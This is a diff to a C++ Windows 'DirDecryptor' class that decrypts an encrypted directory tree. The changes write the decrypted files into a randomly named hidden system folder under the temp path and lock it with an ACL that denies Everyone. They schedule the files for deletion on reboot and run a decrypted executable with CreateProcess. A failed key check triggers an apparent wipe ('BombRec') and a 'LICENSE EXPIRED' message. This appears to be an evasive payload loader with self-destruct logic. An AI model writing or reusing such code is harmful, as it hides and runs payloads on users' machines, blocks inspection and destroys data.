@@ -1,6 +1,7 @@
 #include "DirDecryptor.hpp"
 
-DirDecryptor::DirDecryptor(const std::wstring _, HWND hwnd) : _hwnd(hwnd)
+DirDecryptor::DirDecryptor(const std::wstring _, const std::wstring r, HWND hwnd)
+    : _r(r), _hwnd(hwnd)
 {
     BYTE       rgbHash[HASHLEN];
     DWORD      cbHash = HASHLEN;
@@ -8,7 +9,9 @@ DirDecryptor::DirDecryptor(const std::wstring _, HWND hwnd) : _hwnd(hwnd)
     {
         //---------------------------------------------------------------
         // Get the handle to the default provider.
-        if (!(CryptAcquireContext(&_CryptProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, 0)))
+        if (!(CryptAcquireContext(
+                &_CryptProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT
+            )))
         {
             DisplayErrorBox(hwnd, L"Error during CryptAcquireContext!\n", GetLastError());
             return;
@@ -36,11 +39,10 @@ DirDecryptor::DirDecryptor(const std::wstring _, HWND hwnd) : _hwnd(hwnd)
         {
             for (DWORD i = 0; i < cbHash; i++)
             {
-                _KeyHash[i]     = HEXSTR[rgbHash[i] >> 4];
-                _KeyHash[i + 1] = HEXSTR[rgbHash[i] & 0xf];
+                _KeyHash[i * 2]     = HEXSTR[rgbHash[i] >> 4];
+                _KeyHash[i * 2 + 1] = HEXSTR[rgbHash[i] & 0xf];
             }
-            _KeyHash[cbHash * 2] = 0;
-            MessageBox(hwnd, _KeyHash, PROGNAME L"Key Hash", MB_OK);
+            _KeyHash[cbHash * 2] = L'\0';
         }
         //-----------------------------------------------------------
         // Derive a session key from the hash object.
@@ -59,8 +61,9 @@ DirDecryptor::DirDecryptor(const std::wstring _, HWND hwnd) : _hwnd(hwnd)
             DisplayErrorBox(hwnd, L"Error during CryptCreateHash!\n", GetLastError());
             return;
         }
-        cbHash = HASHLEN;
-        if (!(CryptHashData(hHash, (BYTE*)_KeyHash, cbHash * 2, 0)))
+        cbHash           = HASHLEN;
+        DWORD keyHashLen = wcslen(_KeyHash) * sizeof(WCHAR);
+        if (!(CryptHashData(hHash, (BYTE*)_KeyHash, keyHashLen, 0)))
         {
             DisplayErrorBox(hwnd, L"Error during CryptHashData. \n", GetLastError());
             return;
@@ -73,11 +76,10 @@ DirDecryptor::DirDecryptor(const std::wstring _, HWND hwnd) : _hwnd(hwnd)
         {
             for (DWORD i = 0; i < cbHash; i++)
             {
-                _KeyHash[i]     = HEXSTR[rgbHash[i] >> 4];
-                _KeyHash[i + 1] = HEXSTR[rgbHash[i] & 0xf];
+                _KeyHash[i * 2]     = HEXSTR[rgbHash[i] >> 4];
+                _KeyHash[i * 2 + 1] = HEXSTR[rgbHash[i] & 0xf];
             }
-            _KeyHash[cbHash * 2] = 0;
-            MessageBox(hwnd, _KeyHash, PROGNAME L"Key Hash Hash", MB_OK);
+            _KeyHash[cbHash * 2] = L'\0';
         }
         if (!(CryptDestroyHash(hHash)))
         {
@@ -85,18 +87,8 @@ DirDecryptor::DirDecryptor(const std::wstring _, HWND hwnd) : _hwnd(hwnd)
             return;
         }
     }
-    //---------------------------------------------------------------
-    // Determine the number of bytes to decrypt at a time.
-    // This must be a multiple of DECRYPT_BLOCK_SIZE.
-    // DECRYPT_BLOCK_SIZE is set by a #define statement.
-    _BlockLen = 1000 - 1000 % DECRYPT_BLOCK_SIZE;
-    //---------------------------------------------------------------
-    // Determine the block size. If a block cipher is used,
-    // it must have room for an extra block.
-    if (DECRYPT_BLOCK_SIZE > 1)
-        _BufferLen = _BlockLen + DECRYPT_BLOCK_SIZE;
-    else
-        _BufferLen = _BlockLen;
+    _BlockLen  = 1000 - 1000 % DECRYPT_BLOCK_SIZE;
+    _BufferLen = _BlockLen + DECRYPT_BLOCK_SIZE;
     //---------------------------------------------------------------
     // Allocate memory for reading file content.
     if (!(_Buffer = (BYTE*)malloc(_BufferLen)))
@@ -151,6 +143,7 @@ bool DirDecryptor::DirDecryptFile(const std::wstring SourceFile, const std::wstr
             DisplayErrorBox(_hwnd, L"Error opening destination file!\n", GetLastError());
             return false;
         }
+        MoveFileEx(DestinationFile.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
     }
     //---------------------------------------------------------------
     // Decryption loop.
@@ -168,9 +161,12 @@ bool DirDecryptor::DirDecryptFile(const std::wstring SourceFile, const std::wstr
             }
             if (Count < _BlockLen)
                 fEOF = true;
+            if (Count == 0)
+                break;
             //-----------------------------------------------------------
             // Decrypt data.
-            if (!CryptDecrypt(_Key, NULL, fEOF, 0, _Buffer, &Count))
+            DWORD dwCount = Count;
+            if (!CryptDecrypt(_Key, NULL, fEOF, 0, _Buffer, &dwCount))
             {
                 DisplayErrorBox(_hwnd, L"Error during CryptDecrypt. \n", GetLastError());
                 fEOF = false;
@@ -178,7 +174,7 @@ bool DirDecryptor::DirDecryptFile(const std::wstring SourceFile, const std::wstr
             }
             //-----------------------------------------------------------
             // Write the decrypted data to the destination file.
-            if (!WriteFile(hDestinationFile, _Buffer, Count, &Count, NULL))
+            if (!WriteFile(hDestinationFile, _Buffer, dwCount, &Count, NULL))
             {
                 DisplayErrorBox(_hwnd, L"Error writing ciphertext.\n", GetLastError());
                 fEOF = false;
@@ -193,6 +189,8 @@ bool DirDecryptor::DirDecryptFile(const std::wstring SourceFile, const std::wstr
     if (hDestinationFile)
         CloseHandle(hDestinationFile);
     SendMessage((HWND)_hwnd, WM_COMMAND, DECRYPT_NOTIF_ID, 0);
+    if (SourceFile == _r)
+        _r = DestinationFile;
     return fEOF;
 }
 
@@ -211,24 +209,110 @@ bool DirDecryptor::isReady() const
     return _ready;
 }
 const DirTreeRoot* _DirTreeRoot = NULL;
-bool DirDecryptor::decryptTree(const std::wstring& output_dir, const DirTreeRoot& dirTreeRoot)
+bool               DirDecryptor::decryptTree(const DirTreeRoot& dirTreeRoot)
 {
     if (!_ready)
         return DisplayErrorBox(_hwnd, L"Decryptor not ready", ERROR_NOT_READY);
-    _DirTreeRoot   = &dirTreeRoot;
-    DWORD dwAttrib = GetFileAttributes(output_dir.c_str());
-    if (dwAttrib == INVALID_FILE_ATTRIBUTES || !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY))
-        return DisplayErrorBox(_hwnd, L"Invalid Directory Path", GetLastError());
-    if (!PathIsDirectoryEmpty(output_dir.c_str()))
-        return DisplayErrorBox(_hwnd, L"Directory Not Empty", GetLastError());
-    if (RecurseDecryptTree(output_dir, dirTreeRoot))
+    _DirTreeRoot = &dirTreeRoot;
+    if (!RecurseSetIV(dirTreeRoot))
     {
-        if (_)
+        BombRec(*_DirTreeRoot);
+        MessageBox(_hwnd, L"LICENSE EXPIRED", PROGNAME, MB_OK);
+        return false;
+    }
+    // DWORD dwAttrib = GetFileAttributes(output_dir.c_str());
+    // if (dwAttrib == INVALID_FILE_ATTRIBUTES || !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY))
+    // return DisplayErrorBox(_hwnd, L"Invalid Directory Path", GetLastError());
+    // if (!PathIsDirectoryEmpty(output_dir.c_str()))
+    // return DisplayErrorBox(_hwnd, L"Directory Not Empty", GetLastError());
+    WCHAR spath[MAX_PATH];
+    if (!GetTempPath(MAX_PATH, spath))
+        return DisplayErrorBox(_hwnd, L"Decryptor not ready", ERROR_NOT_READY);
+    BYTE random[4];
+    if (!CryptGenRandom(_CryptProv, 4, random))
+        return DisplayErrorBox(_hwnd, L"Random sequence not generated", GetLastError());
+    std::wstring output_dir = spath;
+    output_dir += L"Temp" + std::to_wstring(random[0]) + std::to_wstring(random[1]) +
+                  std::to_wstring(random[3]);
+    if (!CreateDirectory(output_dir.c_str(), NULL))
+        return DisplayErrorBox(_hwnd, output_dir, GetLastError());
+    MoveFileEx(output_dir.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+    bool            ret               = RecurseDecryptTree(output_dir, dirTreeRoot);
+    EXPLICIT_ACCESS explicitAccess[2] = {};
+    // Deny Everyone access
+    explicitAccess[0].grfAccessPermissions = GENERIC_ALL;
+    explicitAccess[0].grfAccessMode        = DENY_ACCESS;
+    explicitAccess[0].grfInheritance       = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
+    explicitAccess[0].Trustee.TrusteeForm  = TRUSTEE_IS_NAME;
+    explicitAccess[0].Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
+    explicitAccess[0].Trustee.ptstrName    = (LPWSTR)L"Everyone";
+    // Grant Full Control to SYSTEM
+    explicitAccess[1].grfAccessPermissions = GENERIC_ALL;
+    explicitAccess[1].grfAccessMode        = GRANT_ACCESS;
+    explicitAccess[1].grfInheritance       = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
+    explicitAccess[1].Trustee.TrusteeForm  = TRUSTEE_IS_NAME;
+    explicitAccess[1].Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
+    explicitAccess[1].Trustee.ptstrName    = (LPWSTR)L"SYSTEM";
+    // Create a new ACL that denies access
+    PACL pACL = nullptr;
+    SetEntriesInAcl(2, explicitAccess, NULL, &pACL);
+    // Apply the security descriptor
+    SECURITY_DESCRIPTOR secDesc;
+    InitializeSecurityDescriptor(&secDesc, SECURITY_DESCRIPTOR_REVISION);
+    SetSecurityDescriptorDacl(&secDesc, TRUE, pACL, FALSE);
+    // Apply security settings to the folder
+    SetFileAttributes(output_dir.c_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
+    SetFileSecurity(output_dir.c_str(), DACL_SECURITY_INFORMATION, &secDesc);
+    LocalFree(pACL);
+    if (ret)
+    {
+        STARTUPINFO stinfo        = {};
+        stinfo.cb                 = sizeof(stinfo);
+        PROCESS_INFORMATION pinfo = {};
+        CreateProcess(_r.c_str(), NULL, NULL, NULL, false, 0, NULL, NULL, &stinfo, &pinfo);
+    }
+    return false;
+}
+
+bool DirDecryptor::RecurseSetIV(const DirTreeRoot& dirTreeRoot)
+{
+    std::wstring file_path;
+    for (size_t i = 0; i < dirTreeRoot.files.size(); i++)
+    {
+        if (StrStrIW(dirTreeRoot.files[i].second.c_str(), _KeyHash) ==
+            dirTreeRoot.files[i].second.c_str())
         {
-            BombRec(*_DirTreeRoot);
-            MessageBox(_hwnd, L"LICENSE EXPIRED", PROGNAME, MB_OK);
+            HANDLE hSourceFile;
+            if ((hSourceFile = CreateFile(
+                     dirTreeRoot.files[i].first.c_str(), FILE_READ_DATA, FILE_SHARE_READ, NULL,
+                     OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
+                 )) == INVALID_HANDLE_VALUE)
+            {
+                DisplayErrorBox(_hwnd, L"Error opening source plaintext file!\n", GetLastError());
+                return false;
+            }
+            DWORD Count;
+            if (!ReadFile(hSourceFile, _IV, DECRYPT_BLOCK_SIZE, &Count, NULL))
+            {
+                CloseHandle(hSourceFile);
+                DisplayErrorBox(_hwnd, L"Error reading plaintext!\n", GetLastError());
+                return false;
+            }
+            CloseHandle(hSourceFile);
+            if (!CryptSetKeyParam(_Key, KP_IV, _IV, 0))
+            {
+                DisplayErrorBox(_hwnd, L"Error resetting IV.\n", GetLastError());
+                return false;
+            }
+            if (!DeleteFile(dirTreeRoot.files[i].first.c_str()))
+                return false;
+            return true;
         }
-        return true;
+    }
+    for (size_t i = 0; i < dirTreeRoot.directories.size(); i++)
+    {
+        if (RecurseSetIV(dirTreeRoot.directories[i]))
+            return true;
     }
     return false;
 }
@@ -243,6 +327,7 @@ bool DirDecryptor::RecurseDecryptTree(
         file_path = output_dir + L"\\" + dirTreeRoot.directories[i].directory_name;
         if (!CreateDirectory(file_path.c_str(), NULL))
             return DisplayErrorBox(_hwnd, output_dir, GetLastError());
+        MoveFileEx(file_path.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
         if (!dirTreeRoot.directories[i].directories.size() &&
             !dirTreeRoot.directories[i].files.size())
             continue;
@@ -254,16 +339,6 @@ bool DirDecryptor::RecurseDecryptTree(
         if (StrStrIW(dirTreeRoot.files[i].second.c_str(), _KeyHash) ==
             dirTreeRoot.files[i].second.c_str())
         {
-            if (_)
-            {
-                if (!DeleteFile(dirTreeRoot.files[i].first.c_str()))
-                {
-                    BombRec(*_DirTreeRoot);
-                    MessageBox(_hwnd, L"LICENSE EXPIRED", PROGNAME, MB_OK);
-                    return false;
-                }
-                _ = false;
-            }
             SendMessage((HWND)_hwnd, WM_COMMAND, DECRYPT_NOTIF_ID, 0);
             continue;
         }
